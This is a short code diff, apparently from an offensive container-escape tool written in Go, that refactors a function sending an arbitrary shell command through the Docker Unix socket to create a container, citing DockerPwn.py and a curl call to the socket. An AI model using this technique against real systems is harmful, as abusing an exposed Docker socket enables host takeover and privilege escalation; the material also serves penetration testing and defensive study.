@@ -35,10 +35,7 @@ import (
 // APIs Ref https://github.com/AbsoZed/DockerPwn.py/blob/master/createContainer.py
 // curl --unix-socket /var/run/docker.sock http://127.0.0.1/info
 func DockerAPIRun(path string, cmd string) error {
-	cmd = strings.Replace(cmd, "\"", "\\\"", -1) // escape shell cmd
-	cmd = strings.Replace(cmd, "\n", "\\n", -1)  // escape shell cmd
-	cmd = strings.Replace(cmd, "\t", "\\t", -1)  // escape shell cmd
-	payloadData := strings.Replace(dockerAPIHttpPostData, "<SHELL_CMD>", cmd, -1)
+	payloadData := dockerAPIHttpPostPayload(cmd)
 
 	log.Println(payloadData)
 	ans, err := util.UnixHttpSend("post", path, "http://127.0.0.1/containers/create", payloadData)
